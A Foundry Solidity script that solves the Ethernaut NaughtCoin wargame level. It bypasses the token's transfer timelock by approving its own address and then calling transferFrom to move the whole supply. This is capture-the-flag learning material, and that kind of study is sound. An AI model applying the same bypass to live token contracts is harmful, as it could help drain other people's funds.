// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/EthernautNaughtCoin.sol";

// interface IERC20 {
//     function transferFrom(
//         address _from,
//         address _to,
//         uint256 _value
//     ) external returns (bool success);

//     function approve(
//         address _spender,
//         uint256 _value
//     ) public returns (bool success);
// }

contract NaughtCoinSolution is Script {
    NaughtCoin naughtCoin =
        NaughtCoin(0x8dB18862BfC124F630cE3256263Db499Ce1ef237);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        naughtCoin.approve(
            vm.envAddress("MY_ADDRESS"), // This the spender
            naughtCoin.INITIAL_SUPPLY()
        );
        naughtCoin.transferFrom(
            vm.envAddress("MY_ADDRESS"),
            address(naughtCoin),
            naughtCoin.INITIAL_SUPPLY()
        );
        vm.stopBroadcast();
        console.log(
            "My balance after transfer",
            naughtCoin.balanceOf(vm.envAddress("MY_ADDRESS"))
        );
    }
}
